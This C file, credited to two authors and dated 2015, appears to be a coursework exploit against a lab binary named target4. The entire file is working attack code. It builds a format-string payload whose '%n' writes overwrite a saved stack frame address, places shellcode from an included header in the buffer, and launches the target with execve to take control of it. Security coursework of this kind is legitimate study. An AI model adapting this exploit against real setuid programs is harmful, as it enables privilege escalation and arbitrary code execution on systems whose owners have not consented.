 // (c) 2015 Tony Liu and Reid Pryzant
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include "shellcode.h"

#define DEFAULT_STRING_SIZE 256
#define SHELL_LOCATION      200 //our choices
#define SHELL_ADDR          0xbfffffb7
#define FRAME_ADDR          0xbffffd3c

char *makeString() {
  char *str = (char *)malloc(DEFAULT_STRING_SIZE);
  int i;  

  //to ensure no zeroes are floating around
  for (i = 0; i < DEFAULT_STRING_SIZE; i++) {
    str[i] = 'A';
  }

  memcpy(str, "\x3c\xfd\xff\xbf----\x3d\xfd\xff\xbf----\x3e\xfd\xff\xbf----\x3f\xfd\xff\xbf", 28);

  int midpt = DEFAULT_STRING_SIZE / 2;
  char *mid_ptr = &str[midpt];
  memcpy(mid_ptr, "%55x%n%72x%n%256x%n%192x%n", 26);

  char *late_ptr = &str[SHELL_LOCATION];
  memcpy(late_ptr, shellcode, sizeof(shellcode));

  str[DEFAULT_STRING_SIZE - 1] = '\0';

  return str;
}

int main(int argc, char *argv[])
{
  char *args[3];
  char *env[1];
  char *target = (argc == 2) ? argv[1] : "/usr/local/bin/target4";

  args[0] = target; args[1] = makeString(); args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(target, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
